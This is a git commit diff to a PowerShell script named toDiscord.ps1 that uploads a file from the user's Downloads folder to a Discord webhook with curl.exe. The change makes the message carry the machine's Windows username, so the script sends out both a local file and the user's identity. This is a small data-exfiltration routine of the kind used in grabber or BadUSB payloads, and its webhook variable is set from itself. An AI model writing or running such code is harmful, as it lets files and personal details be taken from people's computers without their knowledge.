f047496c6528b784327129ce57c3b1d016e9b8f6
SolidPiku <85856662+SolidPiku@users.noreply.github.com>
2024-11-05 12:08:35 -0600

    Update toDiscord.ps1

--- toDiscord.ps1
+++ toDiscord.ps1
@@ -2,7 +2,7 @@ $path = "$env:USERPROFILE\Downloads\test.txt\"
 
 function Upload-Discord {
 $wh = "https://discord.com/api/webhooks/$wh"
-curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"$path`"" $wh
+curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"$env:username\`"}" -F "file=@\`"$path`"" $wh
 }
 
 Upload-Discord
